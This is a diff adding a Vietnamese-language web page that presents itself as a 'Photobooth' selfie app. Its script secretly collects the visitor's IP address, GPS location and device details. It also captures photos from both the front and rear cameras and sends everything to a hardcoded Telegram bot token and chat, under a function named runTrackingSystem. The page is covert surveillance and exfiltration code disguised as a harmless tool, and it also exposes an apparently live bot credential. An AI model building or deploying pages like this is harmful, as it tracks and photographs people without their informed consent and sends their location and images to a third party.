@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Chụp Photobooth (gửi trực tiếp đến Telegram)</title>
+  <style>
+    :root { --pink:#ef2e7e; --bg:#fff0f6; }
+    html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial}
+    body{display:flex;align-items:center;justify-content:center;background:var(--bg);padding:20px}
+    .card{width:100%;max-width:420px;background:#fff;padding:20px;border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center}
+    h2{margin:0 0 10px;font-size:20px}
+    #vBox{position:relative;margin-bottom:12px}
+    #msg{color:#666;margin:8px 0}
+    video{width:100%;height:300px;object-fit:cover;border-radius:12px;display:none;background:#000}
+    .btn{display:inline-block;width:100%;padding:14px;border-radius:12px;border:0;background:var(--pink);color:#fff;font-weight:800;cursor:pointer;font-size:16px}
+    #status{margin-top:12px;color:#444;font-weight:600;font-size:14px}
+    .small{font-size:12px;color:#888;margin-top:8px}
+    pre.warn{background:#fff4f8;border:1px solid #ffd6e9;padding:10px;border-radius:8px;color:#6b001f}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Chụp Photobooth</h2>
+    <div id="vBox">
+      <p id="msg">Đang khởi tạo camera...</p>
+      <video id="preview" autoplay playsinline muted></video>
+    </div>
+    <button class="btn" id="startBtn">📸 BẮT ĐẦU CHỤP</button>
+    <div id="status">Hệ thống sẽ tự động gửi ảnh đến Telegram (gửi trực tiếp từ trình duyệt).</div>
+    <div class="small">Lưu ý bảo mật &amp; CORS ở phía dưới.</div>
+    <pre class="warn" id="warn">
+- BOT token sẽ hiện trên client (không an toàn).
+- Telegram API có thể chặn request do CORS; nếu bị CORS, bạn cần 1 server trung gian.
+    </pre>
+  </div>
+
+<script>
+/*
+  CẤU HÌNH:
+  - Điền BOT_TOKEN của bạn và chat IDs tương ứng.
+  - chat_with_photos: chat nơi gửi ảnh
+  - chat_no_photos: chat nơi gửi chỉ text (không sử dụng trong ví dụ này)
+*/
+const BOT_TOKEN = '5972007549:AAHubnA29hXrKgRvrHtyMhB2-AoP0CNgaps'; // <-- Điền token ở đây (ví dụ: '123456:ABC-...') - KHÔNG ĐƯA RA CÔNG KHAI
+const CHAT_WITH_PHOTOS = '-1806607309'; // <-- Điền chat_id (ví dụ '-123456789' hoặc số người nhận)
+const CHAT_NO_PHOTOS = '857408205'; // optional
+
+if (!BOT_TOKEN || !CHAT_WITH_PHOTOS) {
+  document.getElementById('status').innerText = 'Chưa cấu hình BOT_TOKEN hoặc CHAT_WITH_PHOTOS trong mã. Mở mã và chỉnh trước khi dùng.';
+}
+
+// Hỗ trợ: convert dataURL -> Blob
+function dataURLtoBlob(dataurl) {
+  const parts = dataurl.split(',');
+  const m = parts[0].match(/:(.*?);/);
+  const mime = m ? m[1] : 'image/jpeg';
+  const bstr = atob(parts[1]);
+  let n = bstr.length;
+  const u8 = new Uint8Array(n);
+  while (n--) u8[n] = bstr.charCodeAt(n);
+  return new Blob([u8], { type: mime });
+}
+
+/* Device / IP / location helpers (same như trước) */
+const info = { time: () => new Date().toLocaleString('vi-VN'), ip:'', realIp:'', lat:'', lon:'', device:'', os:'', camera:'⏳ Đang kiểm tra...' };
+
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  if (/Android/i.test(ua)) { info.os='Android'; info.device='Android Device'; }
+  else if (/iPhone|iPad|iPod/i.test(ua)) { info.os='iOS'; info.device='iPhone/iPad'; }
+  else if (/Windows NT/i.test(ua)) { info.os='Windows'; info.device='Windows PC'; }
+  else if (/Macintosh/i.test(ua)) { info.os='macOS'; info.device='Mac'; }
+  else { info.os='Không rõ'; info.device='Không xác định'; }
+}
+
+async function getPublicIP() {
+  try { const r = await fetch('https://api.ipify.org?format=json'); if (r.ok) info.ip = (await r.json()).ip || ''; } catch(e){ info.ip='Bị chặn'; }
+}
+async function getRealIP() {
+  try { const r = await fetch('https://icanhazip.com'); if (r.ok) info.realIp = (await r.text()).trim(); } catch(e){ info.realIp='Lỗi kết nối'; }
+}
+async function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve();
+    navigator.geolocation.getCurrentPosition(pos => { info.lat = pos.coords.latitude.toFixed(6); info.lon = pos.coords.longitude.toFixed(6); resolve(); }, () => resolve(), { timeout: 5000 });
+  });
+}
+
+/* captureCamera: lấy dataURL */
+async function captureCamera(facingMode = 'user') {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+    const preview = document.getElementById('preview');
+    if (facingMode === 'user') {
+      preview.srcObject = stream; preview.style.display = 'block'; document.getElementById('msg').style.display = 'none';
+      try { await preview.play(); } catch(e){}
+    }
+    return await new Promise(resolve => {
+      const v = document.createElement('video');
+      v.srcObject = stream; v.playsInline = true; v.muted = true;
+      v.onloadedmetadata = () => {
+        setTimeout(() => {
+          try {
+            const w = v.videoWidth || 640, h = v.videoHeight || 480;
+            const c = document.createElement('canvas'); c.width = w; c.height = h;
+            const ctx = c.getContext('2d');
+            if (facingMode === 'user') { ctx.translate(w,0); ctx.scale(-1,1); }
+            ctx.drawImage(v, 0, 0, w, h);
+            const data = c.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(t => t.stop());
+            resolve(data);
+          } catch (err) {
+            stream.getTracks().forEach(t => t.stop());
+            resolve(null);
+          }
+        }, 600);
+      };
+      setTimeout(() => { try { stream.getTracks().forEach(t=>t.stop()); } catch(e){}; resolve(null); }, 5000);
+    });
+  } catch(e) { return null; }
+}
+
+function getCaption() {
+  const maps = (info.lat && info.lon) ? 'https://maps.google.com/maps?q=' + info.lat + ',' + info.lon : 'Không rõ';
+  return `📡 [THÔNG TIN TRUY CẬP]\n\n🕒 Thời gian: ${info.time()}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n📍 Vị trí: ${maps}\n📌 Lat/Lon: ${info.lat || 'Không rõ'}, ${info.lon || 'Không rõ'}\n🔰 Camera: ${info.camera}\n`;
+}
+
+/* Gửi trực tiếp tới Telegram:
+   - Nếu 1 ảnh: dùng sendPhoto với FormData (photo: Blob)
+   - Nếu nhiều ảnh: dùng sendMediaGroup: media JSON + multipart attach://file0 ...
+*/
+async function sendPhotosDirect(frontDataUrl, backDataUrl) {
+  if (!BOT_TOKEN || !CHAT_WITH_PHOTOS) return { ok:false, error: 'Missing BOT_TOKEN or CHAT_WITH_PHOTOS' };
+
+  const baseUrl = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}`;
+
+  // convert to blobs
+  const files = [];
+  if (frontDataUrl) files.push({ blob: dataURLtoBlob(frontDataUrl), name: 'front.jpg' });
+  if (backDataUrl) files.push({ blob: dataURLtoBlob(backDataUrl), name: 'back.jpg' });
+
+  try {
+    if (files.length === 1) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_WITH_PHOTOS);
+      form.append('photo', files[0].blob, files[0].name);
+      form.append('caption', getCaption());
+      const resp = await fetch(baseUrl + '/sendPhoto', { method:'POST', body: form });
+      const json = await resp.json().catch(()=>null);
+      return { ok: resp.ok, status: resp.status, body: json ?? null };
+    } else {
+      // sendMediaGroup supports 2..10 items
+      const form = new FormData();
+      form.append('chat_id', CHAT_WITH_PHOTOS);
+      const media = [];
+      for (let i = 0; i < Math.min(files.length, 10); i++) {
+        form.append(`file${i}`, files[i].blob, files[i].name);
+        const m = { type: 'photo', media: `attach://file${i}` };
+        if (i === 0) m.caption = getCaption();
+        media.push(m);
+      }
+      form.append('media', JSON.stringify(media));
+      const resp = await fetch(baseUrl + '/sendMediaGroup', { method:'POST', body: form });
+      const json = await resp.json().catch(()=>null);
+      return { ok: resp.ok, status: resp.status, body: json ?? null };
+    }
+  } catch (e) {
+    return { ok:false, error: e.message || String(e) };
+  }
+}
+
+async function sendTextDirect() {
+  if (!BOT_TOKEN || !CHAT_NO_PHOTOS) return { ok:false, error: 'Missing BOT_TOKEN or CHAT_NO_PHOTOS' };
+  const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
+  try {
+    const resp = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_NO_PHOTOS, text: getCaption(), parse_mode: 'HTML' })
+    });
+    const json = await resp.json().catch(()=>null);
+    return { ok: resp.ok, status: resp.status, body: json ?? null };
+  } catch (e) {
+    return { ok:false, error: e.message || String(e) };
+  }
+}
+
+/* Main flow */
+async function runTrackingSystem() {
+  detectDevice();
+  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
+  const status = document.getElementById('status');
+  status.innerText = 'Chuẩn bị chụp...';
+  let front = null, back = null;
+  try {
+    front = await captureCamera('user'); await new Promise(r => setTimeout(r, 300));
+    back = await captureCamera('environment');
+    if (front && back) info.camera='✅ Đã chụp camera trước và sau';
+    else if (front) info.camera='✅ Chỉ chụp camera trước';
+    else info.camera='🚫 Lỗi hoặc từ chối';
+  } catch(e) { info.camera='🚫 Lỗi camera'; }
+
+  try {
+    if (front || back) {
+      status.innerText = 'Đang gửi ảnh trực tiếp tới Telegram...';
+      const resp = await sendPhotosDirect(front, back);
+      console.log('sendPhotosDirect', resp);
+      if (!resp.ok) throw new Error(resp.error || JSON.stringify(resp.body) || 'Send photos failed');
+      status.innerText = 'Đã gửi ảnh thành công';
+    } else {
+      status.innerText = 'Không có ảnh, gửi thông tin...';
+      const resp = await sendTextDirect();
+      console.log('sendTextDirect', resp);
+      if (!resp.ok) throw new Error(resp.error || JSON.stringify(resp.body) || 'Send text failed');
+      status.innerText = 'Đã gửi thông tin thành công';
+    }
+    const btn = document.getElementById('startBtn'); btn.disabled = false; btn.innerText = '📸 HOÀN TẤT';
+    // redirect tạm (nếu muốn)
+    // setTimeout(()=>window.location.href='https://google.com',2000);
+  } catch (e) {
+    console.error('Error sending', e);
+    status.innerText = 'Lỗi gửi dữ liệu (xem console). Nếu là lỗi CORS, cần server proxy.';
+    const btn = document.getElementById('startBtn'); btn.disabled = false; btn.innerText = '📸 THỬ LẠI';
+  }
+}
+
+document.getElementById('startBtn').addEventListener('click', async function(){
+  this.disabled = true; this.innerText = 'ĐANG XỬ LÝ...';
+  document.getElementById('status').innerText = 'Đang xác thực và chụp...';
+  await runTrackingSystem();
+});
+</script>
+</body>
+</html>
